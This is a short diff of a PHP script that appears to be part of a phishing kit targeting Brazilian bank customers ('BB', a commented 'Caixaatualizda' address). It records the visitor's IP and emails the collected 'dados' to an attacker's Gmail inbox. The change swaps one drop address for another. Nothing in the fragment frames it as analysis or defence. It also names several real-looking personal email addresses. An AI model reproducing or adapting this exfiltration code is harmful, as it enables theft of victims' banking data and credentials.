@@ -4,7 +4,8 @@
 		$ip = $_SERVER['REMOTE_ADDR'];
 
 		//$emaildestinatario = 'Caixaatualizda@gmail.com';
-		$emaildestinatario = 'erickqueiroz93@gmail.com';
+		//$emaildestinatario = 'erickqueiroz93@gmail.com';
+                $emaildestinatario = 'Kikoo5543@gmail.com';
 
 		$subj = "Dados / IP: $ip - Chegou: BB";
 
